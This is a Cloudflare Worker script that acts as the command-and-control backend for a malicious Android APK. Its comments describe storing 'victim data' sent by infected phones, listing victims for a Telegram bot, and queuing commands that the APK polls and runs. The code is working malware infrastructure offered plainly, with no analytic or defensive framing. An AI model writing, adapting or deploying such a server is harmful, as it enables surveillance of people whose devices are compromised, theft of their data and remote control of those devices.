export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const auth = request.headers.get("X-Survival-Key");

    // Verify secret token (APK ↔ Cloudflare)
    if (auth !== env.SECRET_KEY) return new Response("Access denied", { status: 403 });

    // APK Check-In (Stores victim data)
    if (url.pathname === "/register" && request.method === "POST") {
      const data = await request.json();
      await env.VICTIM_DB.put(data.id, JSON.stringify(data));
      return new Response("OK");
    }

    // Telegram Bot Command (Retrieve victim data)
    if (url.pathname === "/victims" && request.method === "GET") {
      const victims = await env.VICTIM_DB.list();
      return new Response(JSON.stringify(victims));
    }

    // Execute Commands (APK polls this)
    if (url.pathname === "/commands" && request.method === "GET") {
      const victimId = url.searchParams.get("id");
      const commands = await env.COMMAND_QUEUE.get(victimId);
      return new Response(commands || "[]");
    }

    return new Response("404", { status: 404 });
  }
};
